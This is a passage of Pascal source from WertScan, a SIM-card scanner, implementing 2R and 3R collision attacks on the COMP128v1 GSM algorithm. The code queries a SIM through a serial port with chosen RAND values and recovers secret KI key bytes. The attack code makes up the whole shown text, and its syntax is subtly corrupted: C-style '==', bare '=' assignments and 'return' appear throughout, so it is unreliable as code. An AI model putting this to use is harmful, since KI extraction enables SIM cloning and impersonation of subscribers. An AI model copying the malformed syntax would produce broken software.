{WERT Sim-Card Scanner. 
 Copyright (C) 2004-2005 by Wert (AKA Joda).

 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

 Project home root - ftp://ftp.ionb.ru/pub/sim/
 Author's e-mail   - wert@ionb.ru}

unit Attacks;
 {Модуль WertScan-а с процедурами атак}
 
interface
 uses
  WTypes,Synaser;
 function A2Rv1(var Port:TBlockSerial;Pair:byte;var KIPair:TPair):Longint; 
 function A3Rv1(var Port:TBlockSerial;Pair:byte;CPair:TPair;var KIPair:TPair):Longint;
 function A4Rv1(var Port:TBlockSerial;Pair:byte;CPair1,CPair2:TPair;var KIPair:TPair):Longint;
 function A5Rv1(var Port:TBlockSerial;Pair:byte;CData:TData8;var KIPair:TPair):Longint;
 function BForcev1(var Port:TBlockSerial;Pair:byte;KI:TData16;var KIPair:TPair):Longint;
 function BForce2Pv1(var Port:TBlockSerial;Pairs:byte;KI:TData16;var KIPair1,KIPair2:TPair):Longint;
 function ChKIv1(var Port:TBlockSerial;KI:TData16):Longint;
 function FindKiv1(var Port:TBlockSerial;Pair:byte;var ResKi:TData16):Longint;
  
implementation
 uses
  SysUtils,
  Tables,Functions,ComPort,Emulator;

 {Функция проведения 2R-атаки на алгоритм Comp128v1}
 function A2Rv1(var Port:TBlockSerial;Pair:byte;var KIPair:TPair):Longint; 
  var
   Res:Longint;
   Index:array[0..$FF] of Longint;
   SearchBuffer:PAttack2Rv1Buffer;
   R0_after_R1,R8_after_R1:array[0..255] of TPair;
   CollBuffer:PA2Rv1_Coll;
   IndexCollBuffer:PA2Rv1_CollIndex;
   PairRes:TPair;
   EmulRes:TData4;
   SB_Uk,SC_Uk:Longint;
   I,J:Longint;
   FoundPair1,FoundPair2:TPair;       {Пары RAND-а, давшие коллизию}
   FoundPair1Ex,FoundPair2Ex:TPair;   {Пары RAND-а, давшие еще одну коллизию}
   Uk:Longint;                       {Индекс в таблице проверяемых пар}
   Pr,PrS:Boolean; 
   Rand,RetraceRand:TData16;
   PrevColl,NextColl:Longint;
   CurPair,CurCalcPair:TPair;
   Result:Longint;
   CRand1,CRand2:TData16;
   CSRes1,CSRes2:TData12;
   SRes:TData12;
   S:String[5];
   B:byte;
   Prev,Next:Longint;
   EmulRes1,EmulRes2:TData4;
   AllFound:Longint;
   KiPair2:TPair;
   
  begin
   Res  =  0;
   FillChar(KIPair[0],2,$0);
   LWriteln('-------------------------------',2);
   LWriteln('Starting 2R-attack on pair '+IntToStr(Pair)+'...',2);
   LWriteln('-------------------------------',2);
   SearchBuffer  =  nil;
   GetMem(SearchBuffer,SizeOf(TAttack2Rv1Buffer));
   if SearchBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for SearchBuffer!',2);
    LWriteln('',2);
    A2Rv1  =  -1;
    return;
   end;
   CollBuffer  =  nil;
   GetMem(CollBuffer,SizeOf(TA2Rv1_Coll));
   if CollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for CollBuffer!',2);
    LWriteln('',2);
    A2Rv1  =  -1;
    return;
   end;
   IndexCollBuffer  =  nil;
   GetMem(IndexCollBuffer,SizeOf(TA2Rv1_CollIndex));
   if IndexCollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for IndexCollBuffer!',2);
    LWriteln('',2);
    A2Rv1  =  -1;
    return;
   end;
   {Ищем коллизию}
   SB_Uk  =  0;
   for I  =  0 to $FF do Index[I]  =  -1;
   FillChar(FoundPair1[0],2,$0);
   FillChar(FoundPair2[0],2,$0);
   FillChar(Rand[0],16,$0);
   LWrite('->00000',1);
   Uk  =  0;
   Pr  =  true;
   while Pr == true do begin
    CurPair  =  RandPair_2R_v1[Uk];
    Rand[Pair]  =  CurPair[0];
    Rand[Pair+8]  =  CurPair[1];
    Uk  =  Uk+1;
    LWrite(#8#8#8#8#8,1);
    S  =  IntToStr(Uk);
    while Length(S)<5 do S  =  '0'+S;
    LWrite(S,1);
    while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes)<>0) do ;
    if RetraceFile == '' then begin
     Result  =  Gsm(Port,Rand,SRes);
    end
    else begin
     Result  =  0;
     if Compare2Rands(RetraceRand,Rand) == false then begin
      LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
      LWriteln('Expected   ==  '+PrintHexData16(Rand,true),2);
      LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
      LWriteln('',2);
      A2Rv1  =  -1;
      return;
     end;
    end; 
    if Result == 0 then begin
     B  =  SRes[0];
     if Index[B] == -1 then begin
      SearchBuffer^[SB_Uk].SRes  =  SRes;
      SearchBuffer^[SB_Uk].Pair  =  CurPair;
      SearchBuffer^[SB_Uk].Next  =  -1;
      Index[B]  =  SB_Uk;
      SB_Uk  =  SB_Uk+1;
     end
     else begin
      Next  =  Index[B];
      Prev  =  -1;
      while Next<>-1 do begin
       PrS  =  true;
       for I  =  0 to 11 do begin
        if SearchBuffer^[Next].SRes[I]<>SRes[I] then begin
 	 PrS  =  false;
 	 break;
	end;
       end;
       if PrS then begin
        FoundPair1  =  SearchBuffer^[Next].Pair;
	FoundPair2  =  CurPair;
	{Нашли коллизию}
	LWriteln(chr($0D),1);
	LWriteln('Collision found ('+PrintHexPair(FoundPair1,false)+','+PrintHexPair(FoundPair2,false)+').',2);
	{Ищем пары KI}
        LWriteln('Calculating KI pair...',2);
        AllFound  =  0;
        for CurCalcPair[0]  =  0 to $FF do begin
         for CurCalcPair[1]  =  0 to $FF do begin
          EmulRes1  =  Emu_2Rounds_v1(CurCalcPair,FoundPair1);
          EmulRes2  =  Emu_2Rounds_v1(CurCalcPair,FoundPair2);
          PrS  =  true;
          for I  =  0 to 3 do begin
           if EmulRes1[I]<>EmulRes2[I] then begin
            PrS  =  false;
            break;
           end;
          end;
          if PrS then begin
           LWriteln('Found KI pair  ==  '+PrintHexPair(CurCalcPair,false)+'.',2);
	   KiPair2  =  KiPair;
           KiPair  =  CurCalcPair;
           AllFound  =  AllFound+1;
          end;
         end;
	end;
        if AllFound == 0 then begin
         LWriteln('KI pair not found! Found collision is not 2R collision.',2);
     	 LWrite('->00000',1);
        end;
        if AllFound>1 then begin
         LWriteln('Found some KI pairs! Using extra calculation...',2);
	 {Ищем 2R-коллизию для пары KiPair2}
	 FillChar(IndexCollBuffer^[0][0],4*256*256,$FF);
	 SC_Uk  =  0;
         for I  =  0 to $FF do begin 
	  R0_after_R1[I][0]  =  Comp128v1_T0[KiPair2[0]+2*I];
	  R0_after_R1[I][1]  =  Comp128v1_T0[2*KiPair2[0]+I];
	 end; 
         for I  =  0 to $FF do begin 
	  R8_after_R1[I][0]  =  Comp128v1_T0[KiPair2[1]+2*I];
	  R8_after_R1[I][1]  =  Comp128v1_T0[2*KiPair2[1]+I];
	 end; 
         for CurPair[0]  =  0 to $FF do begin
          for CurPair[1]  =  0 to $FF do begin
	   PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
	   PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
           Move(PairRes[0],EmulRes[0],2);
	   PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
	   PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
           Move(PairRes[0],EmulRes[2],2);
	   PrS  =  false;
           if IndexCollBuffer^[EmulRes[0]][EmulRes[1]] == -1 then begin
 	    CollBuffer^[SC_Uk].B2  =  EmulRes[2];
	    CollBuffer^[SC_Uk].B3  =  EmulRes[3];
	    CollBuffer^[SC_Uk].Pair  =  CurPair;
	    CollBuffer^[SC_Uk].Next  =  -1;
	    IndexCollBuffer^[EmulRes[0]][EmulRes[1]]  =  SC_Uk;
	    SC_Uk  =  SC_Uk+1;
	   end
	   else begin
	    NextColl  =  IndexCollBuffer^[EmulRes[0]][EmulRes[1]];
	    PrevColl  =  -1;
	    PrS  =  false;
            while NextColl<>-1 do begin
	     if (CollBuffer^[NextColl].B2 == EmulRes[2]) and (CollBuffer^[NextColl].B3 == EmulRes[3]) then begin
	      FoundPair1Ex  =  CollBuffer^[NextColl].Pair;
	      FoundPair2Ex  =  CurPair;
	      PrS  =  true;
	     end;
             if PrS then begin
	      if ((FoundPair1Ex[0] == FoundPair1[0]) and (FoundPair1Ex[1] == FoundPair1[1]) and
	       (FoundPair2Ex[0] == FoundPair2[0]) and (FoundPair2Ex[1] == FoundPair2[1])) or
	       ((FoundPair1Ex[0] == FoundPair2[0]) and (FoundPair1Ex[1] == FoundPair2[1]) and
	       (FoundPair2Ex[0] == FoundPair1[0]) and (FoundPair2Ex[1] == FoundPair1[1])) then PrS  =  false
	      else break;
	     end;
             PrevColl  =  NextColl;
             NextColl  =  CollBuffer^[NextColl].Next;
            end;
	    if NextColl == -1 then begin
  	     CollBuffer^[SC_Uk].B2  =  EmulRes[2];
	     CollBuffer^[SC_Uk].B3  =  EmulRes[3];
             CollBuffer^[SC_Uk].Pair  =  CurPair;
             CollBuffer^[SC_Uk].Next  =  -1;
             CollBuffer^[PrevColl].Next  =  SC_Uk;
             SC_Uk  =  SC_Uk+1;
            end;
	   end;
	   if PrS then break;
	  end;
	  if PrS then break;
	 end; 
	 {Проверяем пару по найденной коллизии}
         FillChar(CRand1[0],16,$0);
         FillChar(CRand2[0],16,$0);
	 CRand1[Pair]  =  FoundPair1Ex[0];
	 CRand1[Pair+8]  =  FoundPair1Ex[1]; 
	 CRand2[Pair]  =  FoundPair2Ex[0];
	 CRand2[Pair+8]  =  FoundPair2Ex[1]; 
	 while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes1)<>0) do ;
         if RetraceFile == '' then begin
          Result  =  Gsm(Port,CRand1,CSRes1);
         end
         else begin
          Result  =  0;
          if Compare2Rands(RetraceRand,CRand1) == false then begin
           LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
           LWriteln('Expected   ==  '+PrintHexData16(CRand1,true),2);
           LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
           LWriteln('',2);
           A2Rv1  =  -1;
           return;
          end;
         end; 
         if (Result<>0) then begin
          A2Rv1  =  -1;
          return;
         end;
	 while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes2)<>0) do ;
         if RetraceFile == '' then begin
          Result  =  Gsm(Port,CRand2,CSRes2);
         end
         else begin
          Result  =  0;
          if Compare2Rands(RetraceRand,CRand2) == false then begin
           LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
           LWriteln('Expected   ==  '+PrintHexData16(CRand2,true),2);
           LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
           LWriteln('',2);
           A2Rv1  =  -1;
           return;
          end;
         end; 
         if (Result<>0) then begin
          A2Rv1  =  -1;
          return;
         end;
         PrS  =  true;
         for J  =  0 to 11 do begin
          if CSRes1[J]<>CSRes2[J] then begin
     	   PrS  =  false;
   	   break;
	  end;
         end;
	 if PrS then begin
	  LWriteln(PrintHexPair(KiPair2,false)+' - Ok, '+PrintHexPair(KiPair,false)+' - Wrong.',2);
	  KiPair  =  KiPair2;
	 end
	 else begin
	  LWriteln(PrintHexPair(KiPair2,false)+' - Wrong, '+PrintHexPair(KiPair,false)+' - Ok.',2);
	 end;
	 AllFound  =  1;
        end;
        if AllFound == 1 then begin
         LWriteln('-------------------------------',2);
         LWriteln('2R-attack OK. KI pair  ==  '+PrintHexPair(KiPair,true)+'. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
         LWriteln('-------------------------------',2);
	 Pr  =  false;
	 break;
        end;
        Prev  =  Next;
        Next  =  SearchBuffer^[Next].Next;
       end
       else begin
        Prev  =  Next;
        Next  =  SearchBuffer^[Next].Next;
       end;
      end;
      if Next == -1 then begin
       SearchBuffer^[SB_Uk].SRes  =  SRes;
       SearchBuffer^[SB_Uk].Pair  =  CurPair;
       SearchBuffer^[SB_Uk].Next  =  -1;
       SearchBuffer^[Prev].Next  =  SB_Uk;
       SB_Uk  =  SB_Uk+1;
      end;
     end;
    end
    else begin
     A2Rv1  =  -1;
     return;
    end;
    if Uk == RP_2R_v1_Length then Pr  =  false;
   end;
   
   FreeMem(SearchBuffer,SizeOf(TAttack2Rv1Buffer));
   FreeMem(CollBuffer,SizeOf(TA2Rv1_Coll));
   FreeMem(IndexCollBuffer,SizeOf(TA2Rv1_CollIndex));
   {Выведем результаты}
   if Uk == RP_2R_v1_Length then begin
    LWriteln('',2);   
    LWriteln('-------------------------------',2);
    LWriteln('2R-attack FAILED! This pair is non-collisions or SIM is not Comp128v1. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
    Res  =  1;
   end; 
   LWriteln('',2);
   A2Rv1  =  Res;
  end;

 {Функция проведения 3R-атаки на алгоритм Comp128v1}  
 function A3Rv1(var Port:TBlockSerial;Pair:byte;CPair:TPair;var KIPair:TPair):Longint; 
  type
   TSearchRec == record
    B0,B1,B2:byte;
    BD:byte;
   end;
   TSearch == array[0..3] of TSearchRec;
  var
   Res:Longint;
   PairRes:TPair;
   EmulRes:TData4;
   Search:TSearch;
   EmulKiRes1,EmulKiRes2:TData8;
   R0_after_R1,R8_after_R1:array[0..255] of TPair;
   CurPair:TPair;
   CurCalcPair:TPair;
   AKiPair:shortint;
   I,J:Longint;
   DataBuffer:PA3Rv1_Data;
   IndexBuffer:PA3Rv1_Index;
   ResBuffer:PA3Rv1_Res;
   CollBuffer:PA3Rv1_Coll;
   IndexCollBuffer:PA3Rv1_CollIndex;
   SD_Uk,Res_Uk,SC_Uk:Longint;
   Cur_Uk:Longint;
   New_Uk,FGood,FBad:Longint;
   CalcByte:byte;
   PrStep:boolean;
   PrS:boolean;
   Prev,Next:Longint;
   PrevColl,NextColl:Longint;
   WorkData:array[0..1] of TPair;
   WorkRes:array[0..1] of TData4;
   Pr3RAttack:boolean;
   Rand1,Rand2:TData16;
   RandCheck1,RandCheck2:TData16;
   RetraceRand:TData16;
   Uk:Longint;
   SRes1,SRes2:TData12;
   S:String[3];
   Result:Longint;
   CollCounter:Longint;
   AllFound:Longint;
   CollB:array[1..16] of byte;
   PrCalculating:boolean;
   AllKiFound:Longint;
   FoundPair1,FoundPair2:TPair;
   KiVar:array[1..16] of TPair;
   CurKiVar:Longint;
   PrUncol:boolean;
   KiVarGood:array[1..16] of byte;
   PrCollGood:boolean;
   GoodKi:array[1..16] of TPair;
   CurGoodKi:Longint;
   CRand1,CRand2:TData16;
   CSRes1,CSRes2:TData12;
   Common:byte;
   
  begin
   Res  =  0;
   FillChar(KIPair[0],2,$0);
   LWriteln('-------------------------------',2);
   LWriteln('Starting 3R-attack on pair '+IntToStr(Pair)+'...',2);
   LWriteln('-------------------------------',2);
   DataBuffer  =  nil;
   GetMem(DataBuffer,SizeOf(TA3Rv1_Data));
   if DataBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for DataBuffer!',2);
    LWriteln('',2);
    A3Rv1  =  -1;
    return;
   end;
   IndexBuffer  =  nil;
   GetMem(IndexBuffer,SizeOf(TA3Rv1_Index));
   if IndexBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for IndexBuffer!',2);
    LWriteln('',2);
    A3Rv1  =  -1;
    return;
   end;
   ResBuffer  =  nil;
   GetMem(ResBuffer,SizeOf(TA3Rv1_Res));
   if ResBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer!',2);
    LWriteln('',2);
    A3Rv1  =  -1;
    return;
   end;
   CollBuffer  =  nil;
   GetMem(CollBuffer,SizeOf(TA3Rv1_Coll));
   if CollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for CollBuffer!',2);
    LWriteln('',2);
    A3Rv1  =  -1;
    return;
   end;
   IndexCollBuffer  =  nil;
   GetMem(IndexCollBuffer,SizeOf(TA3Rv1_CollIndex));
   if IndexCollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for IndexCollBuffer!',2);
    LWriteln('',2);
    A3Rv1  =  -1;
    return;
   end;
   {Исход атаки}
   Pr3RAttack  =  false;
   {Ищем четверки, которые после 2-х раундов отличаются одним байтом}
   LWriteln('Calculating data for 3R-attack...',2);
   FillChar(IndexBuffer^[0][0],4*128*128,$FF);
   SD_Uk  =  0;
   Res_Uk  =  0;
   for I  =  0 to $FF do begin
    R0_after_R1[I][0]  =  Comp128v1_T0[CPair[0]+2*I];
    R0_after_R1[I][1]  =  Comp128v1_T0[2*CPair[0]+I];
   end;    
   for I  =  0 to $FF do begin
    R8_after_R1[I][0]  =  Comp128v1_T0[CPair[1]+2*I];
    R8_after_R1[I][1]  =  Comp128v1_T0[2*CPair[1]+I];
   end;    
   for CurPair[0]  =  0 to $FF do begin
    for CurPair[1]  =  0 to $FF do begin
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
     Search[0].BD  =  PairRes[0];
     Search[1].B0  =  PairRes[0];
     Search[2].B0  =  PairRes[0];
     Search[3].B0  =  PairRes[0];
     Search[0].B0  =  PairRes[1];
     Search[1].BD  =  PairRes[1];
     Search[2].B1  =  PairRes[1];
     Search[3].B1  =  PairRes[1];
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
     Search[0].B1  =  PairRes[0];
     Search[1].B1  =  PairRes[0];
     Search[2].BD  =  PairRes[0];
     Search[3].B2  =  PairRes[0];
     Search[0].B2  =  PairRes[1];
     Search[1].B2  =  PairRes[1];
     Search[2].B2  =  PairRes[1];
     Search[3].BD  =  PairRes[1];
     for CalcByte  =  0 to 3 do begin
      if (IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1] == -1) then begin
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1]  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end
      else begin
       Next  =  IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1];
       Prev  =  -1;
       while Next<>-1 do begin
	if (DataBuffer^[Next].B2 == Search[CalcByte].B2) and (DataBuffer^[Next].Nomer == CalcByte) and
	 (DataBuffer^[Next].BD<>Search[CalcByte].BD) then begin
	 WorkData[0]  =  DataBuffer^[Next].Pair;
	 WorkData[1]  =  CurPair;
	 case CalcByte of
	  0:begin
	   WorkRes[0][0]  =  DataBuffer^[Next].BD;
	   WorkRes[0][1]  =  Search[CalcByte].B0;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].BD;
	   WorkRes[1][1]  =  Search[CalcByte].B0;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  1:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  DataBuffer^[Next].BD;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].BD;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  2:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].BD;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].BD;
	   WorkRes[1][3]  =  Search[CalcByte].B2;	   
	  end;
	  3:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].B2;
	   WorkRes[0][3]  =  DataBuffer^[Next].BD;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].B2;
	   WorkRes[1][3]  =  Search[CalcByte].BD;
	  end;
	 end;
	 ResBuffer^[Res_Uk].Data  =  WorkData;
	 ResBuffer^[Res_Uk].Res  =  WorkRes;
	 ResBuffer^[Res_Uk].Nomer  =  CalcByte;
	 ResBuffer^[Res_Uk].Common  =  0;
	 Res_Uk  =  Res_Uk+1;
	end;
	Prev  =  Next;
        Next  =  DataBuffer^[Next].Next;
       end;
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       DataBuffer^[Prev].Next  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end;
     end;
    end;      
   end;   
   LWriteln('Found '+IntToStr(Res_Uk)+' possible 4-bytes pair groups.',2);
   {Перебираем все найденные четверки}
   if Res_Uk<>0 then begin
    {Проверим, какие четверки могут дать коллизию - найдем байты Common}
    New_Uk  =  0;
    FGood  =  0;
    FBad  =  0;
    for Cur_Uk  =  0 to (Res_Uk-1) do begin
     AllFound  =  0;
     CalcByte  =  ResBuffer^[Cur_Uk].Nomer;
     for I  =  0 to 62 do begin
      if ((RandPair_3R_v1_Common[I].Pair[0] == ResBuffer^[Cur_Uk].Res[0][CalcByte]) and 
       (RandPair_3R_v1_Common[I].Pair[1] == ResBuffer^[Cur_Uk].Res[1][CalcByte])) or
       ((RandPair_3R_v1_Common[I].Pair[0] == ResBuffer^[Cur_Uk].Res[1][CalcByte]) and 
       (RandPair_3R_v1_Common[I].Pair[1] == ResBuffer^[Cur_Uk].Res[0][CalcByte])) then begin
       Common  =  RandPair_3R_v1_Common[I].Common;
       AllFound  =  1;
       break;
      end;
     end;
     if AllFound == 1 then begin
      ResBuffer^[New_Uk].Res  =  ResBuffer^[Cur_Uk].Res;
      ResBuffer^[New_Uk].Data  =  ResBuffer^[Cur_Uk].Data;
      ResBuffer^[New_Uk].Nomer  =  ResBuffer^[Cur_Uk].Nomer;
      ResBuffer^[New_Uk].Common  =  Common;
      New_Uk  =  New_Uk+1;
      if (ResBuffer^[Cur_Uk].Nomer == 1) or (ResBuffer^[Cur_Uk].Nomer == 3) then FGood  =  FGood+1 else FBad  =  FBad+1;
     end;
    end;
    Res_Uk  =  New_Uk;
    LWriteln('Found '+IntToStr(Res_Uk)+' ('+IntToStr(FGood)+','+IntToStr(FBad)+') collision possible 4-bytes pair groups.',2);
    {Проверяем найденные группы - ищем коллизии}
    PrStep  =  false;
    Cur_Uk  =  0;
    while Cur_Uk< == (Res_Uk-1) do begin
     CalcByte  =  ResBuffer^[Cur_Uk].Nomer;
     if ((PrStep == false) and ((CalcByte == 1) or (CalcByte == 3))) or
      ((PrStep == true) and ((CalcByte == 0) or (CalcByte == 2))) then begin
      LWriteln('Using two pair:',2);
      LWriteln(' 1-st pair: '+PrintHexPair(ResBuffer^[Cur_Uk].Data[0],false)+
       ', 2R-result: '+PrintHexData4(ResBuffer^[Cur_Uk].Res[0],false),2);
      LWriteln(' 2-nd pair: '+PrintHexPair(ResBuffer^[Cur_Uk].Data[1],false)+
       ', 2R-result: '+PrintHexData4(ResBuffer^[Cur_Uk].Res[1],false),2); 
      LWriteln(' Common byte == '+PrintHexByte(Common),2);
      {Нашли четверки - начинаем 3R-атаку}
      {Ищем две коллизии}
      AllFound  =  0;
      FillChar(Rand1[0],16,$0);
      FillChar(Rand2[0],16,$0);
      FillChar(RandCheck1[0],16,$11);
      FillChar(RandCheck2[0],16,$11);
      AKiPair  =  Pair-4;
      if AKiPair<0 then AKiPair  =  AKiPair+8;
      Rand1[AKiPair]  =  ResBuffer^[Cur_Uk].Data[0,0];
      RandCheck1[AKiPair]  =  ResBuffer^[Cur_Uk].Data[0,0];
      Rand1[AKiPair+8]  =  ResBuffer^[Cur_Uk].Data[0,1];
      RandCheck1[AKiPair+8]  =  ResBuffer^[Cur_Uk].Data[0,1];
      Rand1[Pair]  =  0;
      RandCheck1[Pair]  =  0;
      Rand2[AKiPair]  =  ResBuffer^[Cur_Uk].Data[1,0];
      RandCheck2[AKiPair]  =  ResBuffer^[Cur_Uk].Data[1,0];
      Rand2[AKiPair+8]  =  ResBuffer^[Cur_Uk].Data[1,1];
      RandCheck2[AKiPair+8]  =  ResBuffer^[Cur_Uk].Data[1,1];
      Rand2[Pair]  =  0;
      RandCheck2[Pair]  =  0;
      LWrite('->000',1);
      Uk  =  0;
      for CollCounter  =  0 to $FF do begin
       Rand1[Pair+8]  =  CollCounter;
       RandCheck1[Pair+8]  =  CollCounter;
       Rand2[Pair+8]  =  CollCounter;
       RandCheck2[Pair+8]  =  CollCounter;
       Uk  =  Uk+1;
       LWrite(#8#8#8,1);
       S  =  IntToStr(Uk);
       while Length(S)<3 do S  =  '0'+S;
       LWrite(S,1);
       while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes1)<>0) do ;
       if RetraceFile == '' then begin
        Result  =  Gsm(Port,Rand1,SRes1);
       end
       else begin
        Result  =  0;
        if Compare2Rands(RetraceRand,Rand1) == false then begin
         LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
         LWriteln('Expected   ==  '+PrintHexData16(Rand1,true),2);
         LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
         LWriteln('',2);
         A3Rv1  =  -1;
         return;
        end;
       end; 
       if (Result<>0) then begin
        A3Rv1  =  -1;
        return;
       end;
       Uk  =  Uk+1;
       LWrite(#8#8#8,1);
       S  =  IntToStr(Uk);
       while Length(S)<3 do S  =  '0'+S;
       LWrite(S,1);
       while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes2)<>0) do ;
       if RetraceFile == '' then begin
        Result  =  Gsm(Port,Rand2,SRes2);
       end
       else begin
        Result  =  0;
        if Compare2Rands(RetraceRand,Rand2) == false then begin
         LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
         LWriteln('Expected   ==  '+PrintHexData16(Rand2,true),2);
         LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
         LWriteln('',2);
         A3Rv1  =  -1;
         return;
        end;
       end; 
       if (Result<>0) then begin
        A3Rv1  =  -1;
        return;
       end;
       PrS  =  true;
       for J  =  0 to 11 do begin
        if SRes1[J]<>SRes2[J] then begin
         PrS  =  false;
         break;
        end;
       end;
       if PrS == true then begin
        AllFound  =  AllFound+1;
        CollB[AllFound]  =  CollCounter;
        LWriteln(chr($0D),1);
        LWriteln('Found '+IntToStr(AllFound)+' collision (00'+PrintHexByte(CollB[AllFound])+').',2);
	{Проверим коллизию}
	LWrite('Checking collision for 3R...',2);
        while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes1)<>0) do ;
        if RetraceFile == '' then begin
         Result  =  Gsm(Port,RandCheck1,SRes1);
        end
        else begin
         Result  =  0;
         if Compare2Rands(RetraceRand,RandCheck1) == false then begin
          LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
          LWriteln('Expected   ==  '+PrintHexData16(RandCheck1,true),2);
          LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
          LWriteln('',2);
          A3Rv1  =  -1;
          return;
         end;
        end; 
        if (Result<>0) then begin
         A3Rv1  =  -1;
         return;
        end;
        while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes2)<>0) do ;
        if RetraceFile == '' then begin
         Result  =  Gsm(Port,RandCheck2,SRes2);
        end
        else begin
         Result  =  0;
         if Compare2Rands(RetraceRand,RandCheck2) == false then begin
          LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
          LWriteln('Expected   ==  '+PrintHexData16(RandCheck2,true),2);
          LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
          LWriteln('',2);
          A3Rv1  =  -1;
          return;
         end;
        end; 
        if (Result<>0) then begin
         A3Rv1  =  -1;
         return;
        end;
        PrS  =  true;
        for J  =  0 to 11 do begin
         if SRes1[J]<>SRes2[J] then begin
     	  PrS  =  false;
   	  break;
	 end;
        end;
	if PrS then begin
	 LWriteln('OK.',2);
	end
	else begin
	 LWriteln('Found collision is not 3R collision.',2);
	 AllFound  =  AllFound-1;
	end;
